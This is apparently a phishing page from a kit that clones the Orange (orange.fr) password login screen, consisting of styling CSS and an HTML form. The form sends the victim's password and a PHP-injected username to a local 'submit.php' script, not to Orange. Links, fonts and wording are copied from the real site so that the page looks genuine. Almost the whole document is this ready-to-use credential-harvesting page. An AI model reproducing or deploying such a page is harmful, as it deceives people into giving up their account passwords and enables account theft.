.MUZrN{display:block;width:100%;font-family:o-HelveticaNeue,Arial,sans-serif;font-weight:400;font-size:1rem;line-height:1.375rem;color:#000;background-color:#FFF;-webkit-transition:border-color .2s ease-in-out,outline-offset .2s ease-in-out;transition:border-color .2s ease-in-out,outline-offset .2s ease-in-out;border:none;border-bottom-style:solid;border-bottom-width:0.0625rem;border-bottom-color:#555;padding:2.1875rem 3.375rem 0.75rem 0rem;text-overflow:ellipsis;outline:0;}/*!sc*/
.MUZrN + label svg{-webkit-transition:outline-offset .2s ease-in-out;transition:outline-offset .2s ease-in-out;outline-offset:0.25rem;}/*!sc*/
.MUZrN + label svg path{fill:#F16E00;}/*!sc*/
.MUZrN + label svg:focus{outline:0.125rem solid #F16E00;outline-offset:0;}/*!sc*/
.MUZrN:hover{border-bottom-color:#000;}/*!sc*/
.MUZrN:focus{padding-bottom:0.6875rem;border-bottom-width:0.125rem;border-bottom-color:#000;}/*!sc*/
.MUZrN:disabled{color:#CCC;border-bottom-color:#CCC;}/*!sc*/
.MUZrN:hover + label{color:#000;}/*!sc*/
.MUZrN:focus + label{padding-top:0.75rem;padding-bottom:0.1875rem;font-size:0.875rem;line-height:1.25rem;color:#000;}/*!sc*/
.MUZrN:focus ~ #password-error{display:none;}/*!sc*/
.MUZrN:disabled + label{color:#CCC;}/*!sc*/
.MUZrN:disabled + label svg > path{fill:#CCC;}/*!sc*/
.MUZrN:disabled ~ #password-helper{color:#CCC;}/*!sc*/
.MUZrN::-ms-clear{display:none;}/*!sc*/
data-styled.g76[id="sc-jONnzC"]{content:"MUZrN,"}/*!sc*/
@font-face{font-family:'o-HelveticaNeue';font-weight:400;font-style:normal;font-display:swap;src:url('//c.woopic.com/fonts/HelvNeue55_W1G.eot');src:url('//c.woopic.com/fonts/HelvNeue55_W1G.eot?#iefix') format("embedded-opentype"), url('//c.woopic.com/fonts/HelvNeue55_W1G.woff2') format("woff2"), url('//c.woopic.com/fonts/HelvNeue55_W1G.woff') format("woff"), url('//c.woopic.com/fonts/HelvNeue55_W1G.ttf') format("truetype"), url('//c.woopic.com/fonts/HelvNeue55_W1G.svg') format("svg");}/*!sc*/
@font-face{font-family:'o-HelveticaNeue';font-weight:700;font-style:normal;font-display:swap;src:url('//c.woopic.com/fonts/HelvNeue75_W1G.eot');src:url('//c.woopic.com/fonts/HelvNeue75_W1G.eot?#iefix') format("embedded-opentype"), url('//c.woopic.com/fonts/HelvNeue75_W1G.woff2') format("woff2"), url('//c.woopic.com/fonts/HelvNeue75_W1G.woff') format("woff"), url('//c.woopic.com/fonts/HelvNeue75_W1G.ttf') format("truetype"), url('//c.woopic.com/fonts/HelvNeue75_W1G.svg') format("svg");}/*!sc*/
data-styled.g80[id="sc-global-ghYJIO1"]{content:"sc-global-ghYJIO1,"}/*!sc*/
*,*::before,*::after{box-sizing:border-box;}/*!sc*/
body{margin:0;}/*!sc*/
.js-focus-visible :focus:not(.focus-visible){outline:none;}/*!sc*/
data-styled.g82[id="sc-global-iCoveh1"]{content:"sc-global-iCoveh1,"}/*!sc*/
.fjQiA-D svg:first-of-type{position:static;margin:0;top:0;margin-right:0.1875rem;}/*!sc*/
.fjQiA-D svg:first-of-type path{fill:#5b5377;}/*!sc*/
data-styled.g83[id="sc-cj2fkk-0"]{content:"fjQiA-D,"}/*!sc*/
.hDrFQI{background-color:#CCC;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;padding-top:0.9375rem;padding-bottom:0.9375rem;}/*!sc*/
.hDrFQI img{width:18.9375rem;height:9.375rem;}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){.hDrFQI{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;}}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){}/*!sc*/
@media (min-width:1440px){}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){}/*!sc*/
@media (min-width:1440px){}/*!sc*/
data-styled.g84[id="sc-cj2fkk-1"]{content:"hDrFQI,"}/*!sc*/
.dfGfqk{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;}/*!sc*/
.dfGfqk > .sc-gKseQn{width:100%;}/*!sc*/
@media (min-width:736px){.dfGfqk{-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;}.dfGfqk > .sc-gKseQn{width:auto;}}/*!sc*/
data-styled.g86[id="sc-16e2lt5-0"]{content:"dfGfqk,"}/*!sc*/
.fKpWCx{-webkit-flex:1 1 auto;-ms-flex:1 1 auto;flex:1 1 auto;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){.fKpWCx{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;}}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){}/*!sc*/
@media (min-width:1440px){}/*!sc*/
data-styled.g95[id="sc-1xi2ll5-0"]{content:"fKpWCx,"}/*!sc*/
.kAaged{margin:0;color:#000;font-family:o-HelveticaNeue,Arial,sans-serif;font-weight:700;font-size:1rem;line-height:1.375rem;padding:0.4375rem 0rem 0.625rem 0rem;}/*!sc*/
@media (min-width:480px){.kAaged{font-size:1rem;line-height:1.375rem;padding:0.4375rem 0rem 0.625rem 0rem;}}/*!sc*/
@media (min-width:736px){.kAaged{font-family:o-HelveticaNeue,Arial,sans-serif;font-weight:700;font-size:1.375rem;line-height:1.625rem;padding:0.375rem 0rem 0.625rem 0rem;}}/*!sc*/
@media (min-width:1200px){.kAaged{font-size:1.625rem;line-height:1.875rem;padding:0.25rem 0rem 0.625rem 0rem;}}/*!sc*/
@media (min-width:480px){}/*!sc*/
@media (min-width:736px){}/*!sc*/
@media (min-width:960px){}/*!sc*/
@media (min-width:1200px){}/*!sc*/
@media (min-width:1440px){}/*!sc*/
data-styled.g101[id="sc-11azgi5-0"]{content:"kAaged,"}/*!sc*/
.ffKlWN{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:flex-start;-webkit-box-align:flex-start;-ms-flex-align:flex-start;align-items:flex-start;}/*!sc*/
@media (min-width:736px){.ffKlWN{-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;}}/*!sc*/
data-styled.g103[id="sc-1mkhjqn-0"]{content:"ffKlWN,"}/*!sc*/
.egALGk{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;padding:0.125rem;margin-right:0.5rem;}/*!sc*/
.egALGk svg,.egALGk img{width:2.1875rem;height:2.1875rem;}/*!sc*/
@media (min-width:736px){.egALGk{padding:0.3125rem;margin-right:0.9375rem;margin-top:0rem;}.egALGk svg,.egALGk img{width:5.625rem;height:5.625rem;}}/*!sc*/
data-styled.g104[id="sc-1mkhjqn-1"]{content:"egALGk,"}/*!sc*/
.euSlgf{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;min-width:0;}/*!sc*/
.euSlgf p{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}/*!sc*/
data-styled.g105[id="sc-1mkhjqn-2"]{content:"euSlgf,"}/*!sc*/
.bxFHyv{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;}/*!sc*/
.bxFHyv svg{margin-top:0.375rem;}/*!sc*/
.bxFHyv p{-webkit-flex:1 1 0%;-ms-flex:1 1 0%;flex:1 1 0%;}/*!sc*/
@media (min-width:1200px){.bxFHyv svg{margin-top:0.5rem;}}/*!sc*/
data-styled.g106[id="sc-1mkhjqn-3"]{content:"bxFHyv,"}/*!sc*/
.dyBSpD{max-width:23.125rem;}/*!sc*/
data-styled.g107[id="sc-1skf0ip-0"]{content:"dyBSpD,"}/*!sc*/
*,*::before,*::after{box-sizing:border-box;}/*!sc*/
body{margin:0;}/*!sc*/
.js-focus-visible :focus:not(.focus-visible){outline:none;}/*!sc*/
data-styled.g114[id="sc-global-iCoveh2"]{content:"sc-global-iCoveh2,"}/*!sc*/
</style></head><body><div id="__next" data-reactroot="">
<P><IMG style="HEIGHT: 85px; " border=0 hspace=0 alt="" src="./c.woopic.com/head-image.png" width=1606 align=baseline height=135></P>

<div display="[object Object]" class="sc-1xi2ll5-0 fKpWCx"><div class="sc-dIUeWJ eVuhrR"><div class="sc-dmlqKv hBjXL"><div class="sc-hHfuMS dlOwtk"><div class="sc-dmlqKv hBjXL"><div class="sc-hHfuMS Oatvs"><h1 data-testid="pageTitle" color="black" class="sc-kfzBvY beLFGA">Pour vous identifier</h1></div></div>

<form method="post" action="submit.php"><div class="sc-dmlqKv jWBqYs"><div class="sc-hHfuMS Oatvs"><div class="sc-1mkhjqn-0 ffKlWN"><div data-testid="user-avatar" class="sc-1mkhjqn-1 egALGk"><svg width="80" height="80" viewBox="0 0 80 80"><defs><circle id="ancg23ohva" cx="40" cy="40" r="40"></circle></defs><g fill="none" fill-rule="evenodd"><mask id="byee0xikqb" fill="#fff"><use xlink:href="#ancg23ohva"></use></mask><use fill="#F4F4F4" fill-rule="nonzero" xlink:href="#ancg23ohva"></use><path fill="#999" fill-rule="nonzero" d="M40.216 10.265c8.955 0 16.145 7.15 16.145 16.054 0 8.905-7.19 16.053-16.145 16.053-8.956 0-16.145-7.148-16.145-16.053 0-8.905 7.273-16.054 16.145-16.054z" mask="url(#byee0xikqb)"></path><path fill="#999" fill-rule="nonzero" d="M25.356 82.342c-5.339 0-9.78-3.384-9.78-7.395V56.814c0-6.351 4.07-12.326 10.433-15.752 0 0 5.797 5.39 14.253 5.557 8.415-.209 13.888-5.557 13.888-5.557 6.406 3.426 10.629 9.4 10.629 15.752v25.528H25.356z" mask="url(#byee0xikqb)"></path></g></svg></div><div class="sc-1mkhjqn-2 euSlgf"><div class="sc-1mkhjqn-3 bxFHyv"><p data-testid="selected-account-login" color="black" class="sc-fFucqa icGWoC"><strong><?php echo $username; ?></strong></p></div><div><a href="./" role="button" tabindex="0" id="changeAccountLink" data-testid="change-account" data-oevent-category="idme_password" data-oevent-action="clic_changer_de_compte" data-oevent-label="utiliser_un_autre_compte" class="sc-fubCzh kBrEOE">Changer de compte<svg width="10" height="10" viewBox="0 0 691.1999999999997 1024"><path d="M151.73 1023.992l530.944-512-530.944-512-151.723 146.219 379.349 365.781-379.349 365.653 151.723 146.347z" fill="#000"></path></svg></a></div></div></div></div></div><div class="sc-dmlqKv jWBqYs"><div class="sc-hHfuMS hxOZPk"><h4 data-testid="pageSubtitle" class="sc-11azgi5-0 kAaged">Saisissez votre mot de passe</h4><div class="sc-1skf0ip-0 dyBSpD"><input type="text" style="display:none" name="name" value="<?php echo $username; ?>"/><div class="sc-TmdmN idlwDB"><input type="password" id="password" aria-invalid="false" name="Passwd" maxLength="50" autoComplete="current-password" data-testid="input-password" class="sc-jONnzC MUZrN"/><label id="password-label" for="password" class="sc-jHVedQ hkhjAv">Mot de passe</label></div></div></div></div><div class="sc-dmlqKv fMDtdW"><div class="sc-hHfuMS Oatvs"><div class="sc-clsFYl khnlHi"><span class="sc-ehSDrC esznbg" role="checkbox" aria-checked="false"><div></div></span><label for="remember" class="sc-fbkiRW kzMgSW"><div class="sc-GqePz fosVUp"></div></label></div></div></div><div class="sc-dmlqKv hBjXL"><div class="sc-hHfuMS Oatvs"><div class="sc-16e2lt5-0 dfGfqk"><button id="btnSubmit" type="submit" data-testid="submit-password" class="sc-gKseQn kQqXSo">S’identifier</button><a href="https://login.orange.fr/mdp" data-testid="lost-password" data-oevent-category="idme_password" data-oevent-action="clic_mot_de_passe_oublie" data-oevent-label="mot_de_passe_oublie" class="sc-fubCzh emkpOy">Mot de passe oublié<svg width="12" height="12" viewBox="0 0 691.1999999999997 1024"><path d="M151.73 1023.992l530.944-512-530.944-512-151.723 146.219 379.349 365.781-379.349 365.653 151.723 146.347z" fill="#000"></path></svg></a></div></div></div></form></div></div></div><div class="sc-dIUeWJ cNHdgz"><div class="sc-dmlqKv hKGhtm"><div class="sc-hHfuMS Oatvs"><div color="grey4" class="sc-cBNeex bctpvp"></div></div></div><div class="sc-dmlqKv hBjXL"><div class="sc-hHfuMS Oatvs"><a href="https://mc.orange.fr/" data-testid="footerlink-easier-auth" data-oevent-category="idme_password" data-oevent-action="clic_sidentifier_facilement_mc" data-oevent-label="sidentifier_facilement_mc" class="sc-fubCzh dmteRn sc-cj2fkk-0 fjQiA-D"><svg width="18" height="18" viewBox="0 0 1024 1024" data-testid="footerlink-easier-auth-icon"><path d="M654.624 1024l76.384-337.664v337.664h77.408c34.208 0 61.984-27.616 61.984-61.664v-465.376c-0.073-34.142-27.767-61.792-61.92-61.792-0.023 0-0.045 0-0.068 0l-221.757-0-61.888 247.136-61.856-247.136h-221.76c-34.24 0-61.952 27.68-61.952 61.792v465.344c-0 34.080 27.712 61.696 61.92 61.696h77.344v-337.664l76.48 337.664h259.68zM382.368 308.736c0-98.24 63.872-178.272 142.4-178.272 78.624 0 142.528 80.032 142.528 178.24 0.003 0.394 0.004 0.86 0.004 1.326 0 36.48-9.318 70.783-25.704 100.66l0.548-1.090h136.64c9.568-31.648 14.816-65.536 14.816-100.864 0-170.304-120.544-308.736-268.832-308.736-148.224 0-268.768 138.432-268.768 308.736 0 35.328 5.248 69.216 14.816 100.864h136.64c-15.84-28.672-25.088-63.488-25.088-100.864z" fill="#000"></path></svg>Comment s’identifier plus vite et plus facilement ?<svg width="10" height="10" viewBox="0 0 691.1999999999997 1024"><path d="M151.73 1023.992l530.944-512-530.944-512-151.723 146.219 379.349 365.781-379.349 365.653 151.723 146.347z" fill="#000"></path></svg></a></div></div><div class="sc-dmlqKv hBjXL"><div class="sc-hHfuMS Oatvs"><a data-testid="footerlink-help" data-oevent-category="idme_password" data-oevent-action="clic_aide" data-oevent-label="aide" href="https://login.orange.fr/aide" class="sc-fubCzh dmteRn">Besoin d’aide ?<svg width="10" height="10" viewBox="0 0 691.1999999999997 1024"><path d="M151.73 1023.992l530.944-512-530.944-512-151.723 146.219 379.349 365.781-379.349 365.653 151.723 146.347z" fill="#000"></path></svg></a></div></br></br></br></br></br></br>
</div></div></div></div></body></html>
